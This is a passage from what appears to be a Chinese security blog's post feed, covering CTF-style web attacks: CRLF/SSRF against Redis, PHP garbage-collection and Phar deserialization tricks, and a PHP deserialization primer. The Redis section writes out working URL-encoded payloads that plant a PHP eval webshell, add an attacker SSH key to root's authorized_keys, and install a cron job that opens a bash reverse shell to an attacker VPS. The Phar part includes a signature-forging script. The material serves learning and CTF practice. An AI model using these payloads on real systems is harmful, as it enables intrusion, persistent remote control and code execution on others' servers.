<span class="string">set x &#x27;&lt;?php eval($_POST[whoami]);?&gt;&#x27;</span>
<span class="string">save</span>
<span class="string">test: &#x27;&#x27;&#x27;</span>
payload = urllib.parse.quote(payload).replace(<span class="string">&quot;%0A&quot;</span>, <span class="string">&quot;%0D%0A&quot;</span>)
payload = <span class="string">&quot;?url=http://127.0.0.1:6379/&quot;</span> + payload
<span class="built_in">print</span>(payload)

<span class="comment"># 输出: ?url=http://127.0.0.1:6379/%20HTTP/1.1%0D%0A%0D%0Aflushall%0D%0Aconfig%20set%20dir%20/var/www/html/%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aset%20x%20%27%3C%3Fphp%20eval%28%24_POST%5Bwhoami%5D%29%3B%3F%3E%27%0D%0Asave%0D%0Atest%3A%20</span></code></pre>
<p>我们现在自己 VPS 上测试一下：</p>
<pre><code class="highlight python">?url=http://<span class="number">47.101</span><span class="number">.57</span><span class="number">.72</span>:<span class="number">6379</span>/%20HTTP/<span class="number">1.1</span>%0D%0A%0D%0Aflushall%0D%0Aconfig%20<span class="built_in">set</span>%20<span class="built_in">dir</span>%<span class="number">20</span>/var/www/html/%0D%0Aconfig%20<span class="built_in">set</span>%20dbfilename%20shell.php%0D%0Aset%20x%<span class="number">20</span>%<span class="number">27</span>%3C%3Fphp%20<span class="built_in">eval</span>%<span class="number">28</span>%24_POST%5Bwhoami%5D%<span class="number">29</span>%3B%3F%3E%<span class="number">27</span>%0D%0Asave%0D%0Atest%3A%<span class="number">20</span></code></pre>
<p><img src="https://p5.ssl.qhimg.com/t012736c55bfe08049f.png" alt="img"></p>
<p>如上图所示，成功发送出了 Redis 命令。下面开始正式攻击：</p>
<pre><code class="highlight python">/?url=http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>/%20HTTP/<span class="number">1.1</span>%0D%0Aflushall%0D%0Aconfig%20<span class="built_in">set</span>%20<span class="built_in">dir</span>%<span class="number">20</span>/var/www/html/%0D%0Aconfig%20<span class="built_in">set</span>%20dbfilename%20shell.php%0D%0Aset%20x%<span class="number">20</span>%<span class="number">27</span>%3C%3Fphp%20<span class="built_in">eval</span>%<span class="number">28</span>%24_POST%5Bwhoami%5D%<span class="number">29</span>%3B%3F%3E%<span class="number">27</span>%0D%0Asave%0D%0Atest%3A%<span class="number">20</span></code></pre>
<p>执行后，成功通过Redis在目标主机的Web目录里面写入了Webshell：</p>
<p><img src="https://p0.ssl.qhimg.com/t01a5cac758fd4e71af.png" alt="img"></p>
<p>蚁剑连接成功：</p>
<p><img src="https://p2.ssl.qhimg.com/t016508ddd55f7008c4.png" alt="img"></p>
<p>还可以通过 Redis 写入 SSH 秘钥和创建计划任务，相应的 Redis 命令如下。</p>
<ul>
<li>写入 SSH 秘钥：</li>
</ul>
<pre><code class="highlight python">flushall
<span class="built_in">set</span> <span class="number">1</span> <span class="string">&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami</span>
<span class="string">&#x27;</span>
config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/
config <span class="built_in">set</span> dbfilename authorized_keys
save</code></pre>
<ul>
<li>创建计划任务</li>
</ul>
<pre><code class="highlight python">flushall
<span class="built_in">set</span> <span class="number">1</span> <span class="string">&#x27;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\n\n&#x27;</span>
config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/
config <span class="built_in">set</span> dbfilename root
save

// <span class="number">47.</span>xxx.xxx<span class="number">.72</span>为攻击者vps的IP</code></pre>
<p>构造 payload 的方法与写 Webshell 的方法是一样的，请自行尝试。</p>
<h3 id="攻击-mysql"><a class="markdownIt-Anchor" href="#攻击-mysql"></a> 攻击 MySQL</h3>
<p>坑。。。</p>
<h3 id="攻击ftp"><a class="markdownIt-Anchor" href="#攻击ftp"></a> 攻击FTP</h3>
<p>鉴于我还没接触过FTP，先搁置了。。</p>
<p>感觉最近接触到的对于HTTP报文的漏洞越来越多了，感觉需要重新好好了解一下HTTP协议了(之前只是为了做题，在入门的时候从来没有思考过去深入了解HTTP协议内部的机制。。</p>
<p>最后再感概一句，CRLF的黄金日子已经过去了唉唉，现在只能在其他攻击里面看到它的影子，这算不算一种时代的眼泪呢。。</p>
]]></content>
      <tags>
        <tag>-Web -HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>GC机制的隐患和利用</title>
    <url>/2025/09/17/GC%E6%9C%BA%E5%88%B6%E7%9A%84%E9%9A%90%E6%82%A3%E5%92%8C%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="gc机制的隐患和利用"><a class="markdownIt-Anchor" href="#gc机制的隐患和利用"></a> GC机制的隐患和利用</h1>
<p>同样是受到队内赛一道题的启发吧，想着研究一下这个gc的机制，之前学pop链的时候也碰到过，但是没有深入的去摸</p>
<p>算是回来补一下坑，顺带把python的gc机制也看一眼</p>
<h2 id="python的gc机制"><a class="markdownIt-Anchor" href="#python的gc机制"></a> Python的gc机制</h2>
<p>Python的回收机制是根据变量值被引用计数的次数来算的</p>
<pre><code class="highlight python">age=<span class="number">18</span></code></pre>
<p>此时18就被关联了一个变量名age引用计数为1</p>
<p>当</p>
<pre><code class="highlight python">y=age</code></pre>
<p>18关联的变量名+1,此时18的引用计数为2</p>
<p>当所有变量与18解除关联关系时，此时变量值18的引用计数为0</p>
<p>其占用的内存就被解释器的gc机制给回收掉了</p>
<p><strong>导致引用计数+1</strong></p>
<ul>
<li>对象被创建并赋值</li>
<li>对象被引用</li>
<li>对象作为参数传入函数</li>
<li>对象作为元素储存在列表，字典等</li>
</ul>
<p><strong>导致引用计数-1</strong></p>
<ul>
<li>del显式销毁对象</li>
<li>变量名被赋予新的对象</li>
<li>一个对象离开作用域(如函数执行完成)</li>
<li>对象所在容器被销毁，或从容器中删除对象</li>
</ul>
<p>可以使用<code>sys.getrefcount()</code>来查看对象的引用计数</p>
<p>而这种机制的隐患就在于循环引用</p>
<p>假如</p>
<pre><code class="highlight python"><span class="keyword">import</span> gc
<span class="keyword">class</span> <span class="title class_">ClassA</span>():
    <span class="keyword">def</span> <span class="title function_">__init__</span>:
        <span class="built_in">print</span>(<span class="string">&#x27;obj born&#x27;</span>)
<span class="keyword">def</span> <span class="title function_">f2</span>():
    <span class="keyword">while</span> <span class="literal">True</span>:
        c1=ClassA()
        c2=ClassA()
        c1.t=c2
        c2.t=c1
        <span class="keyword">del</span> c2
        <span class="keyword">del</span> c1</code></pre>
<p>那么直到显式删除时c1和c2的引用计数都是1，无法被回收，但是此时已经没有其他对象能够引用到c1和c2</p>
<p>这样就会导致关键数据的泄露</p>
<p>但是不用担心，也可以主动触发垃圾回收机制</p>
<ul>
<li>调用<code>gc.collect()</code></li>
<li>当<code>gc</code>模块的计数器达到阈值时</li>
<li>程序退出时</li>
</ul>
<pre><code class="highlight python"><span class="keyword">import</span> gc
<span class="keyword">import</span> os
<span class="keyword">class</span> <span class="title class_">ClassA</span>():
    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):
        <span class="variable language_">self</span>.flag=os.urandom(<span class="number">4</span>)
<span class="keyword">def</span> <span class="title function_">f2</span>():
    c1=ClassA()
    c2=ClassA()
    c1.t=c2
    c2.t=c1
    <span class="keyword">del</span> c2
    <span class="keyword">del</span> c1
gc.set_debug(gc.DEBUG_SAVEALL)

f2()
<span class="built_in">print</span>(<span class="string">&quot;gc.garbage:&quot;</span>, gc.garbage)
unreachable = gc.collect()
<span class="built_in">print</span>(<span class="string">f&quot;Unreachable objects: <span class="subst">&#123;unreachable&#125;</span>&quot;</span>)
<span class="built_in">print</span>(<span class="string">&quot;gc.garbage:&quot;</span>, gc.garbage)
<span class="built_in">print</span>(<span class="string">&quot;gc.garbage:&quot;</span>, gc.garbage[-<span class="number">1</span>].flag)</code></pre>
<p>这样就可以成功泄露flag</p>
<h2 id="php的gc机制"><a class="markdownIt-Anchor" href="#php的gc机制"></a> PHP的gc机制</h2>
<p>对于PHP，gc机制也是用的引用计数+回收周期</p>
<p>当一个变量被设置为<code>NULL</code>，或者没有任何指针指向时，它就会被变成垃圾，被<code>GC</code>机制自动回收掉</p>
<p>那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被<code>GC</code>机制回收，在回收的过程中，它会自动触发<code>_destruct</code>方法，而这也就是我们绕过抛出异常的关键点</p>
<p>在PHP当中，在变量被创建后会被储存在一个名为<code>zval</code>的容器中，在这个<code>zval</code>变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息</p>
<pre><code class="highlight plaintext">第一个字节名为`is_ref`，是`bool`值，它用来标识这个变量是否是属于引用集合。PHP引擎通过这个字节来区分普通变量和引用变量，由于PHP允许用户使用`&amp;`来使用自定义引用，`zval`变量容器中还有一个内部引用计数机制，来优化内存使用。

第二个字节是`refcount`，它用来表示指向`zval`变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用域。</code></pre>
<p>看接下来的这个例子</p>
<pre><code class="highlight plaintext">&lt;?php
$a = &quot;new string&quot;; 
xdebug_debug_zval(&#x27;a&#x27;); //用于查看变量a的zval变量容器的内容
?&gt;</code></pre>
<p>我们可以看到这里定义了一个变量<code>$a</code>，生成了类型为<code>String</code>和值为<code>new string</code>的变量容器，而对于两个额外的字节，<code>is_ref</code>和<code>refcount</code>，我们这里可以看到是不存在引用的，所以<code>is_ref</code>的值应该是false，而<code>refcount</code>是表示变量个数的，那么这里就应该是1，接下来我们验证一下<br>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221115004226-5276fe0e-643b-1.png" alt="img"><br>
接下来我们添加一个引用</p>
<pre><code class="highlight plaintext">&lt;?php
&lt;?php
$a=&quot;new string&quot;; 
$b =&amp;$a;
xdebug_debug_zval(&#x27;a&#x27;);
?&gt;</code></pre>
<p>按照之前的思路，每生成一个变量就有一个<code>zval</code>记录其类型和值以及两个额外字节，那我们这里的话a的<code>refcount</code>应该是1，<code>is_ref</code>应该是<code>true</code>，接下来我们验证一下<br>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221115004246-5e4d4940-643b-1.png" alt="img"><br>
哎，结果不同于我们所想的，这是为什么呢？<br>
因为同一变量容器被变量a和变量b关联，当没必要时,php不会去复制已生成的变量容器。<br>
所以这一个<code>zval</code>容器存储了<code>a</code>和<code>b</code>两个变量，就使得<code>refcount</code>的值为2.</p>
<p>接下来说一下容器的销毁这个事。<br>
变量容器在<code>refcount</code>变成0时就被销毁。它这个值是如何减少的呢，当函数执行结束或者对变量调用了unset()函数,<code>refcount</code>就会减1。<br>
看个例子</p>
<pre><code class="highlight plaintext">&lt;?php
$a=&quot;new string&quot;; 
$b =&amp;$a;
$c =&amp;$b;
xdebug_debug_zval(&#x27;a&#x27;);
unset($b,$c);
xdebug_debug_zval(&#x27;a&#x27;);
?&gt;</code></pre>
<p>按照刚刚所说，那么这里的首次输出的<code>is_ref</code>应该是<code>true</code>，<code>refcount</code>为3。<br>
第二次输出的<code>is_ref</code>值是什么呢，我们可以看到引用<code>$a</code>的变量<code>$b</code>和<code>$c</code>都被<code>unset</code>了，所以这里的<code>is_ref</code>应该是<code>false</code>，也是因为<code>unset</code>，这里的<code>refcount</code>应该从<code>3</code>变成了<code>1</code>，接下来验证一下<br>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221115004304-68c4e59a-643b-1.png" alt="img"></p>
<h3 id="gc机制在反序列化中的应用"><a class="markdownIt-Anchor" href="#gc机制在反序列化中的应用"></a> gc机制在反序列化中的应用</h3>
<p><code>GC</code>如果在PHP反序列化中生效，那它就会直接触发<code>_destruct</code>方法，接下来以例子来演示。</p>
<h4 id="pop链"><a class="markdownIt-Anchor" href="#pop链"></a> pop链</h4>
<p>首先来看变量被<code>unset</code>函数处理的情况</p>
<pre><code class="highlight plaintext">&lt;?php
highlight_file(__FILE__); 
error_reporting(0); 
class test&#123; 
    public $num; 
    public function __construct($num) &#123;
        $this-&gt;num = $num; echo $this-&gt;num.&quot;__construct&quot;.&quot;&lt;/br&gt;&quot;; 
    &#125;
    public function __destruct()&#123;
        echo $this-&gt;num.&quot;__destruct()&quot;.&quot;&lt;/br&gt;&quot;; 
    &#125;
    &#125;
$a = new test(1); 
unset($a);
$b = new test(2); 
$c = new test(3);</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221115004320-7245733c-643b-1.png" alt="img"><br>
这个是一种方法，还有一种方法，如下。<br>
我们知道当对象为<code>NULL</code>时也是可以触发<code>_destruct</code>的，所以我们这里的话来试一下反序列化一个数组，然后写入第一个索引为对象，将第二个赋值为<code>0</code>，看一下能否触发。(原理我感觉应该是给第一个对象赋值为0键时，此时又将0赋值给了另一个，就相当于它失去了引用，被视为垃圾给回收了)<br>
demo如下</p>
<pre><code class="highlight plaintext">&lt;?php
show_source(__FILE__);
$flag = &quot;flag&quot;;
class B &#123;
  function __destruct() &#123;
    global $flag;
    echo $flag;
  &#125;
&#125;
$a = unserialize($_GET[&#x27;1&#x27;]);
throw new Exception(&#x27;你想干什么&#x27;);</code></pre>
<p>我们可以看到这里在反序列化后就抛出异常了，如果按照正常的话，是无法触发<code>_destruct</code>的，我们按照先前所想，这里先反序列化一个数组</p>
<pre><code class="highlight plaintext">&lt;?php
show_source(__FILE__);

class B &#123;
  function __destruct() &#123;
    global $flag;
    echo $flag;
  &#125;
&#125;
$a=array(new B,0);

echo serialize($a);</code></pre>
<p>得到序列化文本如下</p>
<pre><code class="highlight plaintext">a:2:&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:1;i:0;&#125;
对象类型:长度:&#123;类型:长度;类型:长度:类名:值类型:长度;类型:长度;&#125;
数组:长度为2::&#123;int型:长度0;类:长度为1:类名为&quot;B&quot;:值为0 int型:值为1：int型;值为0</code></pre>
<p>接下来我们按照我们所想，将第二个索引置空，就可以触发<code>GC</code>回收机制，因此修改序列化文本为</p>
<pre><code class="highlight plaintext">a:2:&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:0;i:0;&#125;</code></pre>
<p>去尝试一下<br>
成功触发，看到这里也就知道了大致的思路<br>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221115004336-7c4c7b3c-643b-1.png" alt="img"><br>
这里可以看到也是成功提前触发了<code>_destruct</code>，因为如果正常情况的话，有异常抛出就无法再触发<code>_destruct</code>了，而这个思路也是我们在CTF中绕过异常的一个方法。</p>
<h4 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> phar反序列化</h4>
<pre><code class="highlight plaintext">&lt;?php 
highlight_file(__FILE__); 
class Test&#123; 
    public $code; 
    public function __destruct()&#123; 
        eval($this -&gt; code); 
        &#125; 
&#125;
$filename = $_GET[&#x27;filename&#x27;]; 
echo file_get_contents($filename); 
throw new Error(&quot;Garbage collection&quot;); 
?&gt;</code></pre>
<p>看到<code>file_get_contents</code>函数和类，就想到Phar反序列化，所以接下来尝试借助<code>file_get_contents</code>方法来进行反序列化(因为这里只是本地测试一下，所以不再设置文件上传那些，直接将生成的Phar文件放置本地进行利用了)。<br>
构造Exp如下</p>
<pre><code class="highlight plaintext">&lt;?php 
class test&#123;
    public $code= &quot;phpinfo();&quot;;
&#125;
$a = new test();
$c = array($a,0); 
$b = new Phar(&#x27;1.phar&#x27;,0);//后缀名必须为phar
$b-&gt;startBuffering();//开始缓冲 Phar 写操作
$b-&gt;setMetadata($c);//自定义的meta-data存入manifest
$b-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测
$b-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);//添加要压缩的文件
$b-&gt;stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘
?&gt;</code></pre>
<blockquote>
<p>注：需要去检查一下php.ini中的phar.readonly选项，如果是On，需要修改为Off。否则会报错，无法生成phar文件<br>
小Tip: 这里如果有师傅不懂为什么这样写，可以学一下Phar反序列化，我之前也写过一篇关于Phar反序列化的文章，<br>
师傅们可以参考一下<a href="https://tttang.com/archive/1732/">https://tttang.com/archive/1732/</a></p>
</blockquote>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221115004358-88de5276-643b-1.png" alt="img"><br>
用<code>010editor</code>打开phar文件<br>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221115004416-941ec1e8-643b-1.png" alt="img"><br>
可以发现<code>i:1</code>，按照我们之前的思路，我们这里将<code>i:1</code>修改成<code>i:0</code>就可以绕过抛出异常，但在Phar文件中，我们是不能任意修改数据的，否则就会因为签名错误而导致文件出错，不过签名是可以进行伪造的，所以我们先将<code>1.phar</code>中的<code>i:1</code>修改为<code>i:0</code>，接下来利用脚本使得签名正确。<br>
脚本如下</p>
<pre><code class="highlight plaintext">import gzip
from hashlib import sha1
with open(&#x27;D:\\phpStudy\\PHPTutorial\\WWW\html\\1.phar&#x27;, &#x27;rb&#x27;) as file:
    f = file.read() 
s = f[:-28] # 获取要签名的数据
h = f[-8:] # 获取签名类型以及GBMB标识
newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)
open(&quot;2.phar&quot;,&quot;wb&quot;).write(newf)</code></pre>
<p>打开2.phar文件查看一下<br>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20221115004428-9ab93b00-643b-1.png" alt="img"><br>
变成<code>i:0</code>且文件正常，接下来利用phar伪协议包含这个文件</p>
<pre><code class="highlight plaintext">$filename=phar://2.phar</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221115004437-a0864370-643b-1.png" alt="img"><br>
可以发现成功输出了phpinfo。</p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化</title>
    <url>/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="php反序列化学习"><a class="markdownIt-Anchor" href="#php反序列化学习"></a> PHP反序列化学习</h1>
<h2 id="入门之前"><a class="markdownIt-Anchor" href="#入门之前"></a> 入门之前</h2>
<p>首先要知道PHP是一门面向对象的语言</p>
<p>所以会碰到类，对象之类的概念</p>
<p>稍微补充一点罢，不然会听不懂的()</p>
<ul>
<li><strong>类</strong> − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</li>
<li><strong>对象</strong> − 是类的实例。</li>
<li><strong>成员变量</strong> − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的<strong>属性</strong>。</li>
<li><strong>成员函数</strong> − 定义在类的内部，可用于访问对象的数据。</li>
<li><strong>继承</strong> − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</li>
<li><strong>父类</strong> − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</li>
<li><strong>子类</strong> − 一个类继承其他类称为子类，也可称为派生类。</li>
<li><strong>多态</strong> − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</li>
<li><strong>重载</strong> − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</li>
<li><strong>抽象性</strong> − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</li>
<li><strong>封装</strong> − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</li>
<li><strong>构造函数</strong> − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</li>
<li><strong>析构函数</strong> − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做&quot;清理善后&quot; 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</li>
</ul>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;<span class="comment">//类</span>
  <span class="comment">/* 成员变量 */</span>
  <span class="keyword">var</span> <span class="variable">$url</span>;
  <span class="keyword">var</span> <span class="variable">$title</span>;
  
  <span class="comment">/* 成员函数 */</span>
  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
     <span class="variable language_">$this</span>-&gt;url = <span class="variable">$par</span>;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;
     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;url . PHP_EOL;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;
     <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;
  &#125;
  
  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;
     <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;title . PHP_EOL;
  &#125;
&#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Site</span>();<span class="comment">//创建对象</span>
<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setTitle</span>(<span class="string">&#x27;AyaN0&#x27;</span>);<span class="comment">//调用成员方法</span>
<span class="comment">//或者$a-&gt;setTitle=&#x27;AyaN0&#x27;;</span>

<span class="meta">?&gt;</span></code></pre>
<h2 id="pop链构造"><a class="markdownIt-Anchor" href="#pop链构造"></a> pop链构造</h2>
<h3 id="__construct-和-__destruct"><a class="markdownIt-Anchor" href="#__construct-和-__destruct"></a> <code>__construct()</code> 和 <code>__destruct()</code></h3>
<p><code>__construct</code>：当对象<strong>创建</strong>时会自动调用，注意是创建的时候，也就是说有<code>new</code>的时候就会调用，在<code>unserialize</code>时是不会被自动调用的</p>
<pre><code class="highlight plaintext">__destruct()`：当对象被销毁时会自动调用；当新对象创建后，它后面一定会被自动销毁，也就是调用`__construct`后一定会调用`__destruct`；或者我们直接传入一个对象，它后面被销毁时也会调用`__destruct</code></pre>
<p>可以看到，创建对象e时调用了<code>__construct</code>，然后输出序列化后的对象<code>t</code>，最后在销毁对象<code>t</code>时调用了<code>__destruct</code></p>
<ul>
<li>
<p>实例</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="variable">$username</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);
<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);
<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);
<span class="meta">?&gt;</span>
<span class="comment">//__construct test</span></code></pre>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);
<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);
<span class="meta">?&gt;</span>
<span class="comment">//__destruct test</span>
<span class="comment">//__destruct test</span></code></pre>
</li>
</ul>
<h3 id="__sleep-和-__wakeup"><a class="markdownIt-Anchor" href="#__sleep-和-__wakeup"></a> <code>__sleep()</code> 和 <code>__wakeup()</code></h3>
<p><code>__sleep()</code> ：在对象被序列化<strong>之前</strong>被调用，就是说看到<code>serialize</code>时就会被调用，而且是先调用后再执行序列化</p>
<p><code>__wakeup()</code>: 将在<strong>字符串被反序列化之后被立即调用</strong>，就是说<strong>看到</strong><code>unserialize</code><strong>后就会被立即调用</strong></p>
<p>在看到<code>serialize($b)</code>后，它是先调用了<code>__sleep()</code>魔法函数，然后才执行了<code>echo</code>，输出了字符串</p>
<p>直接输入了<strong>字符串</strong>，当它执行了<code>unserialize</code>转换成对象后，就会最先调用<code>__wakeup()</code>，它的优先级最高</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;

    <span class="keyword">public</span> <span class="variable">$username</span>;
    <span class="keyword">public</span> <span class="variable">$nickname</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;
        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;
    &#125;

    <span class="comment">// 重载序列化调用的方法</span>
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="comment">// 返回需要序列化的变量名，过滤掉password变量</span>
        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);
    &#125;

&#125;
<span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);
<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);
<span class="comment">//O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;结果就是过滤掉了password的值</span></code></pre>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;

    <span class="keyword">public</span> <span class="variable">$username</span>;
    <span class="keyword">public</span> <span class="variable">$nickname</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>;
    <span class="keyword">private</span> <span class="variable">$order</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;
        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;
        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;
    &#125;

    <span class="comment">// 定义反序列化后调用的方法</span>
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;
    &#125;
&#125;
<span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;
<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));
<span class="comment">/*</span>
<span class="comment">class User#1 (4) &#123;</span>
<span class="comment">  public $username =&gt;</span>
<span class="comment">  string(1) &quot;a&quot;</span>
<span class="comment">  public $nickname =&gt;</span>
<span class="comment">  string(1) &quot;b&quot;</span>
